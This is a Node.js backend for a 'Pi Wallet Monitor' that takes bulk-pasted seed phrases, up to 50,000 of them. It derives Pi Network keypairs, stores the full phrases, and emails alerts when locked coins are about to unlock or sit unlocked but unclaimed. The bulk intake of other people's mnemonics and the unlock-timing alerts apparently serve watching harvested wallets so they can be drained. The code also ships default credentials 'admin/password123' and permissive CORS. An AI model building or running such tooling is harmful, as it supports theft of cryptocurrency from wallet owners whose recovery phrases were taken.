/**
 * Pi/Stellar Wallet Monitor — Backend API
 * ---------------------------------------------------------------
 * - Add wallets by pasting phrases (one per line, bulk add supported)
 * - Supports up to 50,000 wallets in-memory
 * - Polls Horizon in controlled batches for balances and claimable balances
 * - Email alerts via Brevo SMTP on: new claimable balance,
 *   ~24h/~2h before unlock, payment in/out, and unlocked-but-unclaimed
 * - Read-only, never builds or submits transactions
 * ---------------------------------------------------------------
 */

require('dotenv').config();

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const bip39 = require('bip39');
const hdkey = require('ed25519-hd-key');
const { Keypair, Horizon } = require('stellar-sdk');
const HorizonServer = Horizon.Server;

const app = express();
// Increase payload limit for bulk wallet additions (50k phrases ~= 50MB)
app.use(express.json({ limit: '100mb' }));
app.use(cors({
  origin: true,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));

const CONFIG = {
  PORT: parseInt(process.env.PORT) || 3010,
  HORIZON_URL: process.env.HORIZON_URL || 'https://api.mainnet.minepi.com',
  POLL_INTERVAL_MS: parseInt(process.env.POLL_INTERVAL_MS) || 30000,
  RESERVE_PI: parseInt(process.env.RESERVE_PI) || 1,
  POLL_BATCH_SIZE: parseInt(process.env.POLL_BATCH_SIZE) || 10,
  BREVO_API_KEY: process.env.BREVO_API_KEY || '',
  EMAIL_FROM_NAME: process.env.EMAIL_FROM_NAME || 'Pi Wallet Monitor',
  EMAIL_FROM_ADDRESS: process.env.EMAIL_FROM_ADDRESS || '',
  EMAIL_TO: process.env.EMAIL_TO || '',
  DASH_USER: process.env.DASH_USER || 'admin',
  DASH_PASS: process.env.DASH_PASS || 'password123',
};

const PI_DERIVATION_PATH = "m/44'/314159'/0'";
const REMINDER_24H_MS = 24 * 60 * 60 * 1000;
const REMINDER_2H_MS = 2 * 60 * 60 * 1000;
const REMINDER_WINDOW_MS = 5 * 60 * 1000;

let mailerReady = !!(CONFIG.BREVO_API_KEY && CONFIG.EMAIL_FROM_ADDRESS && CONFIG.EMAIL_TO);
if (!mailerReady) {
  console.warn('[email] Brevo not configured — alerts disabled');
}

const wallets = new Map();
const snapshot = {};
const claimableTracked = new Map();
const seenPayments = new Set();
const sessions = new Map();
const unclaimedNotified = new Set();

// Cached stats — updated incrementally as wallets are polled
let cachedStats = {
  total_wallets: 0,
  total_available: '0.0000000',
  total_claimable: '0.0000000',
  total_claimable_count: 0,
  total_unlocked_unclaimed: '0.0000000',
  total_unlocked_unclaimed_count: 0,
  polled_wallets: 0,
  last_full_update: null,
};

// Full recompute — called after complete poll cycles or on-demand
function recomputeStats() {
  let available = 0, claimable = 0, claimableCount = 0;
  let unclaimedCount = 0, unclaimedTotal = 0;
  let polled = 0;

  for (const w of wallets.values()) {
    const snap = snapshot[w.id];
    if (!snap || !snap.updated_at) continue;
    polled++;
    available += parseFloat(snap.available_balance || 0);
    claimable += parseFloat(snap.claimable_total || 0);
    const cbs = snap.claimables || [];
    claimableCount += cbs.length;
    for (const cb of cbs) {
      if (cb.is_claimable_now) {
        unclaimedCount++;
        unclaimedTotal += parseFloat(cb.amount);
      }
    }
  }

  cachedStats = {
    total_wallets: wallets.size,
    total_available: available.toFixed(7),
    total_claimable: claimable.toFixed(7),
    total_claimable_count: claimableCount,
    total_unlocked_unclaimed: unclaimedTotal.toFixed(7),
    total_unlocked_unclaimed_count: unclaimedCount,
    polled_wallets: polled,
    last_full_update: new Date().toISOString(),
  };
  
  return cachedStats;
}

function deriveKeypair(phrase) {
  const seed = bip39.mnemonicToSeedSync(phrase);
  const derived = hdkey.derivePath(PI_DERIVATION_PATH, seed.toString('hex'));
  return Keypair.fromRawEd25519Seed(Buffer.from(derived.key));
}

function getPhrasePreview(phrase) {
  return phrase.trim().split(' ').slice(0, 3).join(' ');
}

async function sendEmail(subject, text, html) {
  if (!mailerReady) return;
  try {
    await axios.post('https://api.brevo.com/v3/smtp/email', {
      sender: { name: CONFIG.EMAIL_FROM_NAME, email: CONFIG.EMAIL_FROM_ADDRESS },
      to: [{ email: CONFIG.EMAIL_TO }],
      subject, textContent: text, htmlContent: html,
    }, {
      headers: {
        'api-key': CONFIG.BREVO_API_KEY,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
    });
  } catch (e) {
    console.error('[email] failed:', e.response?.data?.message || e.message);
  }
}

function emailHtml({ icon, title, accent, rows, footerNote }) {
  const rowsHtml = rows.map(r => `
    <div style="margin-bottom:14px;">
      <div style="color:#00d4ff;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;margin-bottom:5px;">${r.label}</div>
      <div style="color:#eef4fa;font-size:${r.mono ? '13px' : '15px'};${r.mono ? "font-family:'Courier New',monospace;word-break:break-all;" : ''}${r.big ? 'font-size:20px;font-weight:800;color:#4caf50;' : ''}">${r.value}</div>
    </div>`).join('');
  return `<!DOCTYPE html><html><body style="margin:0;padding:0;background:#0a1420;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#0a1420;padding:28px 12px;">
    <tr><td align="center">
      <table width="480" cellpadding="0" cellspacing="0" style="background:#101f30;border-radius:14px;overflow:hidden;border:1px solid #17324a;font-family:'Segoe UI',Arial,sans-serif;">
        <tr><td style="background:${accent};padding:16px 24px;">
          <span style="color:#04121f;font-size:15px;font-weight:800;letter-spacing:.4px;">${icon} ${title}</span>
        </td></tr>
        <tr><td style="padding:24px 26px;">${rowsHtml}</td></tr>
        <tr><td style="padding:14px 26px;background:#0c1c2c;border-top:1px solid #17324a;">
          <span style="color:#5a7086;font-size:11px;">◎ Pi Wallet Monitor · read-only · ${footerNote || new Date().toUTCString()}</span>
        </td></tr>
      </table>
    </td></tr>
  </table></body></html>`;
}

function evaluatePredicate(predicate) {
  if (!predicate) return { unlock_time: null, is_claimable_now: true };
  let lockUntil = null;

  function walk(pred, negated) {
    if (!pred || pred.unconditional) return;
    if (pred.abs_before) {
      if (negated) {
        const t = new Date(pred.abs_before).getTime();
        if (!lockUntil || t > lockUntil) lockUntil = t;
      }
    }
    if (pred.not) walk(pred.not, !negated);
    if (pred.and) pred.and.forEach(p => walk(p, negated));
    if (pred.or) pred.or.forEach(p => walk(p, negated));
  }

  walk(predicate, false);
  const unlock_time = lockUntil ? new Date(lockUntil).toISOString() : null;
  const is_claimable_now = lockUntil ? Date.now() >= lockUntil : true;
  return { unlock_time, is_claimable_now };
}

async function pollWallet(w) {
  if (!w) return;
  const h = new HorizonServer(CONFIG.HORIZON_URL);
  const id = w.id;

  try {
    const acc = await h.accounts().accountId(w.public_key).call().catch(() => null);
    if (!acc) {
      snapshot[id] = {
        account_exists: false,
        available_balance: '0.0000000',
        raw_balance: '0.0000000',
        claimable_total: '0.0000000',
        claimables: [],
        lockup_count: 0,
        updated_at: new Date().toISOString(),
        error: null
      };
      return;
    }

    const rawBal = acc.balances.find(b => b.asset_type === 'native')?.balance || '0';
    const availBal = Math.max(0, parseFloat(rawBal) - CONFIG.RESERVE_PI);
    const cbs = await h.claimableBalances().claimant(w.public_key).call().catch(() => ({ records: [] }));
    let claimableTotal = 0;
    const claimables = [];

    for (const cb of cbs.records) {
      claimableTotal += parseFloat(cb.amount);
      const claimant = cb.claimants.find(c => c.destination === w.public_key);
      const pred = claimant ? claimant.predicate : null;
      const { unlock_time, is_claimable_now } = evaluatePredicate(pred);
      claimables.push({ id: cb.id, amount: cb.amount, unlock_time, is_claimable_now });
    }

    snapshot[id] = {
      account_exists: true,
      available_balance: availBal.toFixed(7),
      raw_balance: parseFloat(rawBal).toFixed(7),
      claimable_total: claimableTotal.toFixed(7),
      claimables,
      lockup_count: claimables.length,
      updated_at: new Date().toISOString(),
      error: null
    };

    // Unlocked-but-unclaimed alerts
    const phrasePreview = w.phrase_preview || getPhrasePreview(w.phrase);
    const unlockedUnclaimed = claimables.filter(cb => cb.is_claimable_now);
    for (const uc of unlockedUnclaimed) {
      const notifKey = `${w.id}:${uc.id}`;
      if (!unclaimedNotified.has(notifKey)) {
        unclaimedNotified.add(notifKey);
        await sendEmail(
          `🔓 Unlocked but unclaimed — ${phrasePreview}`,
          `Phrase: ${phrasePreview}\nAmount: ${uc.amount} PI\nAddress: ${w.public_key}`,
          emailHtml({
            icon: '🔓', title: 'Unlocked But Unclaimed', accent: '#ff9800',
            rows: [
              { label: 'Phrase', value: phrasePreview, mono: true },
              { label: 'Amount', value: `${uc.amount} PI`, big: true },
              { label: 'Status', value: 'Coins unlocked but NOT moved to available balance' },
              { label: 'Address', value: w.public_key, mono: true },
            ],
          })
        );
      }
    }

    // Payment tracking
    let isFirstPoll = !w.last_payment_cursor;
    const payments = await h.payments().forAccount(w.public_key).order('desc').limit(10).call().catch(() => ({ records: [] }));
    for (const p of payments.records) {
      if (w.last_payment_cursor && seenPayments.has(p.id)) continue;
      seenPayments.add(p.id);
      if (isFirstPoll) continue;
      const direction = p.to === w.public_key ? 'IN' : (p.from === w.public_key ? 'OUT' : '?');
      const amt = p.amount || p.starting_balance || '?';
      await sendEmail(
        `${direction === 'IN' ? '🟢' : '🔴'} Pi ${direction} — ${phrasePreview}`,
        `Amount: ${amt} PI\nTx: ${p.transaction_hash}`,
        emailHtml({
          icon: direction === 'IN' ? '🟢' : '🔴',
          title: `Payment ${direction === 'IN' ? 'Received' : 'Sent'}`,
          accent: direction === 'IN' ? '#4caf50' : '#f44336',
          rows: [
            { label: 'Phrase', value: phrasePreview, mono: true },
            { label: 'Amount', value: `${amt} PI`, big: true },
            { label: 'Direction', value: direction === 'IN' ? 'Incoming ⬇' : 'Outgoing ⬆' },
            { label: 'Address', value: w.public_key, mono: true },
            { label: 'Tx Hash', value: p.transaction_hash, mono: true },
          ],
        })
      );
    }
    if (payments.records.length) w.last_payment_cursor = payments.records[0].paging_token;
    else if (isFirstPoll) w.last_payment_cursor = 'checked';

    // Unlock reminders (24h, 2h)
    for (const cb of claimables) {
      if (cb.is_claimable_now) continue;
      let tracked = claimableTracked.get(cb.id);
      if (!tracked) {
        tracked = { wallet_id: w.id, amount: cb.amount, unlock_time: cb.unlock_time, notified_24h: false, notified_2h: false };
        claimableTracked.set(cb.id, tracked);
        await sendEmail(
          `🟢 New claimable balance — ${phrasePreview}`,
          `Amount: ${cb.amount} PI\nUnlock: ${cb.unlock_time || 'Already claimable'}`,
          emailHtml({
            icon: '🟢', title: 'New Claimable Balance', accent: '#4caf50',
            rows: [
              { label: 'Phrase', value: phrasePreview, mono: true },
              { label: 'Amount', value: `${cb.amount} PI`, big: true },
              { label: 'Address', value: w.public_key, mono: true },
              { label: 'Unlock', value: cb.unlock_time ? new Date(cb.unlock_time).toLocaleString() : 'Already claimable' },
            ],
          })
        );
        continue;
      }
      if (cb.unlock_time) {
        const msLeft = new Date(cb.unlock_time).getTime() - Date.now();
        if (!tracked.notified_24h && msLeft <= REMINDER_24H_MS && msLeft > REMINDER_24H_MS - REMINDER_WINDOW_MS) {
          tracked.notified_24h = true;
          await sendEmail(`🟡 Unlocks in ~24h — ${phrasePreview}`, `Amount: ${cb.amount} PI`,
            emailHtml({ icon: '🟡', title: 'Unlocks in ~24 Hours', accent: '#ffc107', rows: [
              { label: 'Phrase', value: phrasePreview, mono: true },
              { label: 'Amount', value: `${cb.amount} PI`, big: true },
              { label: 'Unlock', value: new Date(cb.unlock_time).toLocaleString() },
            ]}));
        }
        if (!tracked.notified_2h && msLeft <= REMINDER_2H_MS && msLeft > REMINDER_2H_MS - REMINDER_WINDOW_MS) {
          tracked.notified_2h = true;
          await sendEmail(`🟠 Unlocks in ~2h — ${phrasePreview}`, `Amount: ${cb.amount} PI`,
            emailHtml({ icon: '🟠', title: 'Unlocks in ~2 Hours', accent: '#ff9800', rows: [
              { label: 'Phrase', value: phrasePreview, mono: true },
              { label: 'Amount', value: `${cb.amount} PI`, big: true },
              { label: 'Unlock', value: new Date(cb.unlock_time).toLocaleString() },
            ]}));
        }
      }
    }
  } catch (e) {
    if (!snapshot[id] || !snapshot[id].account_exists) {
      snapshot[id] = { error: e.message, account_exists: false, updated_at: new Date().toISOString() };
    } else {
      snapshot[id].error = e.message;
      snapshot[id].updated_at = new Date().toISOString();
    }
  }
}

// ═══════════════════════════ BATCHED POLLING ═══════════════════════════
// Poll wallets in batches to avoid overwhelming Horizon API
let isPolling = false;
let pollProgress = { current: 0, total: 0 };

async function pollAllWallets() {
  if (isPolling) return;
  isPolling = true;

  const allWallets = Array.from(wallets.values());
  const batchSize = CONFIG.POLL_BATCH_SIZE;
  pollProgress = { current: 0, total: allWallets.length };

  for (let i = 0; i < allWallets.length; i += batchSize) {
    const batch = allWallets.slice(i, i + batchSize);
    await Promise.allSettled(batch.map(w => pollWallet(w)));
    
    pollProgress.current = Math.min(i + batchSize, allWallets.length);
    
    // Recompute stats after each batch so the dashboard updates progressively
    recomputeStats();
    
    // Small delay between batches to be nice to the API
    if (i + batchSize < allWallets.length) {
      await new Promise(r => setTimeout(r, 500));
    }
  }

  // Final stats update
  recomputeStats();
  isPolling = false;
  console.log(`[poll] Cycle complete. ${allWallets.length} wallets polled.`);
}

// Start polling cycle
setInterval(pollAllWallets, CONFIG.POLL_INTERVAL_MS);

// ═══════════════════════════ AUTH MIDDLEWARE ═══════════════════════════

const authRequired = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token || !sessions.has(token)) return res.status(401).json({ success: false, error: 'unauthorized' });
  req.authToken = token;
  next();
};

// ═══════════════════════════ ROUTES ═══════════════════════════

app.post('/login', (req, res) => {
  const { user, pass } = req.body || {};
  if (user !== CONFIG.DASH_USER || pass !== CONFIG.DASH_PASS)
    return res.status(401).json({ success: false, error: 'invalid credentials' });
  const token = crypto.randomUUID();
  sessions.set(token, { user, created: Date.now() });
  res.json({ success: true, token });
});

app.get('/api/verify-token', authRequired, (_req, res) => {
  res.json({ success: true });
});

app.post('/api/wallets', authRequired, (req, res) => {
  try {
    const { phrases } = req.body || {};
    if (!phrases || !phrases.trim()) return res.status(400).json({ success: false, error: 'phrases required' });

    // Split on newlines, commas, semicolons, or any common delimiter
    let rawLines = phrases.split(/[\r\n;,]+/).map(p => p.trim()).filter(p => p.length > 0);

    // For each line, if it has more than 24 words, split into 24-word chunks
    const phraseList = [];
    for (const line of rawLines) {
      const words = line.split(/\s+/).filter(w => w.length > 0);
      if (words.length <= 24) {
        phraseList.push(line);
      } else {
        for (let i = 0; i < words.length; i += 24) {
          const chunk = words.slice(i, i + 24).join(' ');
          if (chunk.split(/\s+/).length >= 12) {
            phraseList.push(chunk);
          }
        }
      }
    }

    if (phraseList.length === 0) return res.status(400).json({ success: false, error: 'no valid phrases' });

    const totalPhrases = phraseList.length;
    console.log(`[wallets] Queued ${totalPhrases} phrases for background processing...`);

    // Respond immediately — processing happens in background
    res.json({ success: true, added: 0, queued: totalPhrases, total: wallets.size + totalPhrases, processing: true });

    // Process derivations in background chunks to avoid blocking event loop
    let idx = 0;
    const CHUNK_SIZE = 50;

    function processChunk() {
      const end = Math.min(idx + CHUNK_SIZE, phraseList.length);
      for (let i = idx; i < end; i++) {
        try {
          const phrase = phraseList[i];
          const kp = deriveKeypair(phrase);
          const id = crypto.randomUUID();
          wallets.set(id, {
            id,
            label: kp.publicKey().slice(0, 8),
            phrase: phrase.trim(),
            phrase_preview: getPhrasePreview(phrase),
            public_key: kp.publicKey(),
            created_at: new Date().toISOString(),
            last_payment_cursor: null
          });
        } catch (e) {
          // Skip invalid phrases silently
        }
      }
      idx = end;
      cachedStats.total_wallets = wallets.size;

      if (idx < phraseList.length) {
        setImmediate(processChunk);
      } else {
        console.log(`[wallets] Background processing complete. Total wallets: ${wallets.size}`);
        if (!isPolling) pollAllWallets();
      }
    }

    setImmediate(processChunk);
  } catch (e) {
    res.status(400).json({ success: false, error: e.message });
  }
});

app.get('/api/wallets', authRequired, (req, res) => {
  // Pagination for large wallet sets
  const page = parseInt(req.query.page) || 1;
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  const offset = (page - 1) * limit;

  const allWallets = Array.from(wallets.values());

  // Build the sorted list with computed fields
  const enriched = allWallets.map(w => {
    const snap = snapshot[w.id] || {};
    const claimables = snap.claimables || [];

    let earliest_unlock = null;
    const lockedItems = claimables.filter(cb => !cb.is_claimable_now && cb.unlock_time);
    if (lockedItems.length > 0) {
      lockedItems.sort((a, b) => new Date(a.unlock_time) - new Date(b.unlock_time));
      earliest_unlock = lockedItems[0].unlock_time;
    }

    const unlockedUnclaimed = claimables.filter(cb => cb.is_claimable_now);
    const unlocked_unclaimed_count = unlockedUnclaimed.length;
    const unlocked_unclaimed_total = unlockedUnclaimed.reduce((s, cb) => s + parseFloat(cb.amount), 0).toFixed(7);

    return {
      id: w.id,
      label: w.label,
      public_key: w.public_key,
      phrase_preview: w.phrase_preview || getPhrasePreview(w.phrase),
      created_at: w.created_at,
      account_exists: snap.account_exists || false,
      available_balance: snap.available_balance || '0.0000000',
      raw_balance: snap.raw_balance || '0.0000000',
      claimable_total: snap.claimable_total || '0.0000000',
      claimables,
      lockup_count: snap.lockup_count || 0,
      error: snap.error || null,
      updated_at: snap.updated_at || null,
      earliest_unlock,
      unlocked_unclaimed_count,
      unlocked_unclaimed_total,
      polled: !!snap.updated_at,
    };
  });

  // Sort: unclaimed first → closest unlock → no unlocks last
  enriched.sort((a, b) => {
    const aUnclaimed = a.unlocked_unclaimed_count > 0;
    const bUnclaimed = b.unlocked_unclaimed_count > 0;
    if (aUnclaimed && !bUnclaimed) return -1;
    if (!aUnclaimed && bUnclaimed) return 1;
    if (aUnclaimed && bUnclaimed) return parseFloat(b.unlocked_unclaimed_total) - parseFloat(a.unlocked_unclaimed_total);

    const aUpcoming = !!a.earliest_unlock;
    const bUpcoming = !!b.earliest_unlock;
    if (aUpcoming && !bUpcoming) return -1;
    if (!aUpcoming && bUpcoming) return 1;
    if (aUpcoming && bUpcoming) return new Date(a.earliest_unlock) - new Date(b.earliest_unlock);

    return new Date(b.created_at) - new Date(a.created_at);
  });

  const paginated = enriched.slice(offset, offset + limit);

  // Always compute fresh stats from current snapshot data
  const freshStats = recomputeStats();

  res.json({
    success: true,
    wallets: paginated,
    stats: freshStats,
    pagination: {
      page,
      limit,
      total: enriched.length,
      pages: Math.ceil(enriched.length / limit),
    },
  });
});

app.delete('/api/wallets/:id', authRequired, (req, res) => {
  const { id } = req.params;
  if (!wallets.has(id)) return res.status(404).json({ success: false, error: 'not found' });
  wallets.delete(id);
  delete snapshot[id];
  Array.from(claimableTracked.entries()).forEach(([cbId, t]) => {
    if (t.wallet_id === id) claimableTracked.delete(cbId);
  });
  recomputeStats();
  res.json({ success: true });
});

app.listen(CONFIG.PORT, () => console.log('✓ Pi Wallet Monitor API running on port ' + CONFIG.PORT));
